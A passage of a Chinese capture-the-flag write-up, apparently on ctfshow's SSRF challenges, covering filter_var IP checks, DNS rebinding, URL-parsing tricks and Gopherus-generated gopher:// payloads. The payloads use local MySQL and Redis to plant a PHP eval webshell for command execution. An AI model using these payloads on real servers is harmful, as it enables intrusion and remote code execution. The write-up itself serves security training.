+      int h_length;      //主机IP地址长度，对于IPv4是四字节
+      char **h_addr_list; //主机IP地址列表
+};
+
+#define h_addr h_addr_list[0] 
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>filter_var()函数</p><p>通过指定的过滤器过滤变量</p><p>如果成功，啧返回已过滤的数据，如果失败，则返回false</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>variable</td><td>必需。规定要过滤的变量。</td></tr><tr><td>filter</td><td>可选。规定要使用的过滤器的 ID。</td></tr><tr><td>options</td><td>规定包含标志/选项的数组。检查每个过滤器可能的标志和选项。</td></tr></tbody></table><h3 id="php-filter-函数" tabindex="-1">PHP Filter 函数 <a class="header-anchor" href="#php-filter-函数" aria-label="Permalink to &quot;PHP Filter 函数&quot;">​</a></h3><p>PHP：指示支持该函数的最早的 PHP 版本。</p><table><thead><tr><th>函数</th><th>描述</th><th>PHP</th></tr></thead><tbody><tr><td><a href="http://writeblog.csdn.net/func_filter_has_var.asp" target="_blank" rel="noreferrer">filter_has_var()</a></td><td>检查是否存在指定输入类型的变量。</td><td>5</td></tr><tr><td><a href="http://writeblog.csdn.net/func_filter_id.asp" target="_blank" rel="noreferrer">filter_id()</a></td><td>返回指定过滤器的 ID 号。</td><td>5</td></tr><tr><td><a href="http://writeblog.csdn.net/func_filter_input.asp" target="_blank" rel="noreferrer">filter_input()</a></td><td>从脚本外部获取输入，并进行过滤。</td><td>5</td></tr></tbody></table><table><thead><tr><th><a href="http://writeblog.csdn.net/func_filter_input_array.asp" target="_blank" rel="noreferrer">filter_input_array()</a></th><th>从脚本外部获取多项输入，并进行过滤。</th><th>5</th></tr></thead><tbody><tr><td><a href="http://writeblog.csdn.net/func_filter_list.asp" target="_blank" rel="noreferrer">filter_list()</a></td><td>返回包含所有得到支持的过滤器的一个数组。</td><td>5</td></tr><tr><td><a href="http://writeblog.csdn.net/func_filter_var_array.asp" target="_blank" rel="noreferrer">filter_var_array()</a></td><td>获取多项变量，并进行过滤。</td><td>5</td></tr><tr><td><a href="http://writeblog.csdn.net/func_filter_var.asp" target="_blank" rel="noreferrer">filter_var()</a></td><td>获取一个变量，并进行过滤。</td><td>5</td></tr></tbody></table><h3 id="php-filters" tabindex="-1">PHP Filters <a class="header-anchor" href="#php-filters" aria-label="Permalink to &quot;PHP Filters&quot;">​</a></h3><table><thead><tr><th style="text-align:left;">ID 名称</th><th style="text-align:left;">描述</th></tr></thead><tbody><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_callback.asp" target="_blank" rel="noreferrer">FILTER_CALLBACK</a></td><td style="text-align:left;">调用用户自定义函数来过滤数据。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_string.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_STRING</a></td><td style="text-align:left;">去除标签，去除或编码特殊字符。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_stripped.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_STRIPPED</a></td><td style="text-align:left;">“string” 过滤器的别名。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_encoded.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_ENCODED</a></td><td style="text-align:left;">URL-encode 字符串，去除或编码特殊字符。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_special_chars.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_SPECIAL_CHARS</a></td><td style="text-align:left;">HTML 转义字符 &#39;&quot;&lt;&gt;&amp; 以及 ASCII 值小于 32 的字符。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_email.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_EMAIL</a></td><td style="text-align:left;">删除所有字符，除了字母、数字以及 !#$%&amp;&#39;*±/=?^_`{|}~@.[]</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_url.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_URL</a></td><td style="text-align:left;">删除所有字符，除了字母、数字以及 $-_.+!*&#39;(),{}|\^~[]`&lt;&gt;#%&quot;;/?😡&amp;=</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_number_int.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_NUMBER_INT</a></td><td style="text-align:left;">删除所有字符，除了数字和 ±</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_number_float.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_NUMBER_FLOAT</a></td><td style="text-align:left;">删除所有字符，除了数字、± 以及 .,eE。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_sanitize_magic_quotes.asp" target="_blank" rel="noreferrer">FILTER_SANITIZE_MAGIC_QUOTES</a></td><td style="text-align:left;">应用 addslashes()。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_unsafe_raw.asp" target="_blank" rel="noreferrer">FILTER_UNSAFE_RAW</a></td><td style="text-align:left;">不进行任何过滤，去除或编码特殊字符。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_int.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_INT</a></td><td style="text-align:left;">在指定的范围以整数验证值。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_BOOLEAN</a></td><td style="text-align:left;">如果是 “1”, “true”, “on” 以及 “yes”，则返回 true，如果是 “0”, “false”, “off”, “no” 以及 “”，则返回 false。否则返回 NULL。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_float.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_FLOAT</a></td><td style="text-align:left;">以浮点数验证值。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_regexp.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_REGEXP</a></td><td style="text-align:left;">根据 regexp，兼容 Perl 的正则表达式来验证值。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_url.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_URL</a></td><td style="text-align:left;">把值作为 URL 来验证。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_email.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_EMAIL</a></td><td style="text-align:left;">把值作为 e-mail 来验证。</td></tr><tr><td style="text-align:left;"><a href="https://www.w3school.com.cn/php/filter_validate_ip.asp" target="_blank" rel="noreferrer">FILTER_VALIDATE_IP</a></td><td style="text-align:left;">把值作为 IP 地址来验证。</td></tr></tbody></table><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>gethostbyname — 返回主机名对应的 IPv4地址。 
+filter_var — 使用特定的过滤器过滤一个变量
+FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
+FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
+FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
+FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>所以url不能是私有地址，需要一个公网ip</p><p>利用302跳转和dns重绑定都可以。</p><p>dns重绑定就用这个：<a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noreferrer">dns重绑定</a></p><p>不能有内网ip，所以填一个公网ip:</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042005669.png" alt="image-20240904200529637" loading="lazy" decoding="async"></figure><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042005422.png" alt="image-20240904200513380" loading="lazy" decoding="async"></figure><h3 id="web358" tabindex="-1">web358 <a class="header-anchor" href="#web358" aria-label="Permalink to &quot;web358&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url)){
+    echo file_get_contents($url);
+}
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code></p><p>最终payload(127.0.0.1也可以换成其他形式):</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>url=http://ctf.@127.0.0.1/flag.php?show
+url=http://ctf.@127.0.0.1/flag.php#show
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>原理： 如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042011821.png" alt="image-20240904201143679" loading="lazy" decoding="async"></figure><h3 id="web359" tabindex="-1">web359 <a class="header-anchor" href="#web359" aria-label="Permalink to &quot;web359&quot;">​</a></h3><p>我们抓包，发现有个u和returl参数，returl就是关键点</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042044204.png" alt="image-20240904204410132" loading="lazy" decoding="async"></figure><p>下载工具</p><figure><img src="https://i-blog.csdnimg.cn/blog_migrate/96232bb99b29ea20befa2a98107d0db3.png" alt="image-20220417233251330" loading="lazy" decoding="async"></figure><p>我们拿到</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%01%00%00%00%01
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>但是不能直接使用，因为<code>gopher://127.0.0.1:3306/_</code>后面的内容需要再<code>urlencode</code>一次，最后得到</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>回到环境中，随便输入账号密码跳转到<code>check.php</code>,然后post传参：<code>returl=xxx</code>(把上面得到的传进去)</p><p>然后一句话就写进去了，再访问<code>url/1.php</code> (1.php为我们指定的文件名)，然后进行命令执行</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042051656.png" alt="image-20240904205148598" loading="lazy" decoding="async"></figure><h3 id="web360" tabindex="-1">web360 <a class="header-anchor" href="#web360" aria-label="Permalink to &quot;web360&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这题跟上题类似，我们使用redis</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>python gopherus.py --exploit redis
+
+&lt;?php eval($_post[1]);?&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://i-blog.csdnimg.cn/blog_migrate/c2c77b21fb7a5718180b34688a339981.png" alt="image-20220418223051741" loading="lazy" decoding="async"></figure><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042109345.png" alt="image-20240904210949269" loading="lazy" decoding="async"></figure><!--]--><!--]--><!----><!----></article><!--]--><!--[--><!--[--><!--[--><!----><ul class="post-copyright" m="y-4"><li class="post-copyright-author"><strong>本文作者：</strong><span>北歌</span></li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://kinsey973.github.io/posts/ctfshow-ssrf" target="_blank" title="本文链接">https://kinsey973.github.io/posts/ctfshow-ssrf</a></li><li class="post-copyright-license"><strong>版权声明：</strong><span>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA</a> 许可协议。</span></li></ul><!--]--><!--]--><!--]--></div><!--]--></div><!----></div><!--[--><!--]--><!--[--><div class="post-nav"><div class="post-nav-item"><a href="/posts/%25E8%25A7%25A3%25E5%25AF%2586%25E7%25BD%2591%25E7%25AB%2599" class="post-nav-prev" title="crypto-解密网站"><div class="icon" i-ri-arrow-left-s-line></div><span class="title truncate" text="sm">crypto-解密网站</span></a></div><div class="post-nav-item"><a href="/posts/crypto" class="post-nav-next" title="crypto"><span class="title truncate" text="sm">crypto</span><div class="icon" i-ri-arrow-right-s-line></div></a></div></div><!--]--><!--[--><!--]--><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden comment yun-comment sm:p-6 lg:px-12 xl:px-16" flex="col" min-h="100px" bg="$va-c-bg-light" w="full" p="4"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><!--]--></div><!----></div><!--]--><template class="mt-4 lg:hidden"></template><!--[--><!--]--><!--[--><!--]--></div><!--]--></main><!--[--><button class="xl:hidden toc-btn shadow-md fixed yun-icon-btn z-20 bg-$va-c-bg-soft" opacity="75" right="4" bottom="19"><div i-ri-file-list-line></div></button><!----><aside flex="~ col" class="va-card yun-aside min-h-sm rounded-2" text="center" overflow="auto"><div class="w-full" flex="~ col" pb-2><!--[--><h2 m="t-6 b-2" font="serif black">文章目录</h2><div style="display:none;" data-v-d9db7c40><div class="content" data-v-d9db7c40><div class="outline-title" data-v-d9db7c40>本页</div><div class="outline-marker" data-v-d9db7c40></div><nav aria-labelledby="doc-outline-aria-label" data-v-d9db7c40><span id="doc-outline-aria-label" class="visually-hidden" data-v-d9db7c40> Table of Contents for current page </span><ul class="root va-toc relative z-1 css-i18n-toc" data-v-d9db7c40 data-v-0a3661f1><!--[--><!--]--></ul></nav></div></div><!--]--><div class="flex-grow"></div><!----></div></aside><!--]--><!--]--></div><footer flex="~ col" class="relative yun-footer va-footer px-4 py-4 pt-0 text-$va-c-text-light w-full mt-14" bg="white dark:$va-c-bg-soft" text="center sm"><div class="yun-cloud absolute top--10 left-0 right-0"><svg class="waves" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" fill="var(--yun-c-cloud)"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><!----><div class="copyright flex justify-center items-center gap-2" p="1"><span> © <!--[-->2023 - <!--]--> 2026</span><a class="animate-pulse inline-flex" href="https://www.yunyoujun.cn/sponsors/" target="_blank" title="Sponsor YunYouJun"><div class="i-ri-cloud-line"></div></a><span>北歌</span></div><div class="powered" m="2"><span>由 <a href="https://github.com/YunYouJun/valaxy.git" target="_blank" rel="noopener">Valaxy</a> <span class="op-60">v0.28.7</span> 驱动</span><span mx-1>|</span><span><span>主题</span><span mx-1>-</span><a href="https://github.com/YunYouJun/valaxy/tree/main/packages/valaxy-theme-yun.git" title="valaxy-theme-yun" target="_blank">Yun</a><span class="ml-1 op-60">v0.28.7</span></span></div><!--[--><div>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</div><div>本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</div><!--]--><div class="yun-footer-gradient"></div></footer></div><!--]--></div><script>window.__INITIAL_STATE__='{"pinia":{"yun-app":{"bannerAnimationDone":false},"app":{"showLoading":true},"site":{},"routerStore":{}}}'</script><script type="application/ld+json" data-hid="schema-org-graph">{"@context":"https://schema.org","@graph":[{"@id":"https://kinsey973.github.io/#identity","@type":"Person","name":"北歌","url":"https://kinsey973.github.io/","image":{"@id":"https://kinsey973.github.io/#/schema/image/1"},"sameAs":["/atom.xml","https://music.163.com/#/user/home?id=3954596483","https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&jump_from=webapi","https://github.com/kinsey973","https://travellings.link"]},{"@id":"https://kinsey973.github.io/#website","@type":"WebSite","dateModified":"2024-09-03T15:32:45.000Z","datePublished":"2024-09-03T15:32:45.000Z","inLanguage":"zh-CN","name":"ctfshow ssrf","url":"https://kinsey973.github.io/","publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#webpage","@type":"WebPage","dateModified":"2024-09-03T15:32:45.000Z","datePublished":"2024-09-03T15:32:45.000Z","description":"山行野宿，孤身万里","name":"ctfshow ssrf","url":"https://kinsey973.github.io/","about":{"@id":"https://kinsey973.github.io/#identity"},"isPartOf":{"@id":"https://kinsey973.github.io/#website"},"potentialAction":[{"@type":"ReadAction","target":["https://kinsey973.github.io/"]}]},{"@id":"https://kinsey973.github.io/#article","dateModified":"2024-09-03T15:32:45.000Z","datePublished":"2024-09-03T15:32:45.000Z","description":"山行野宿，孤身万里","headline":"ctfshow ssrf","inLanguage":"zh-CN","thumbnailUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png","@type":["Article","BlogPosting"],"author":{"@id":"https://kinsey973.github.io/#/schema/person/1"},"image":{"@id":"https://kinsey973.github.io/#/schema/image/2"},"isPartOf":{"@id":"https://kinsey973.github.io/#webpage"},"mainEntityOfPage":{"@id":"https://kinsey973.github.io/#webpage"},"publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#/schema/person/1","@type":"Person","name":"北歌","url":"https://valaxy.site"},{"@id":"https://kinsey973.github.io/#/schema/image/1","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png"},{"@id":"https://kinsey973.github.io/#/schema/image/2","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png"}]}</script>
+  
+</body>
+</html>
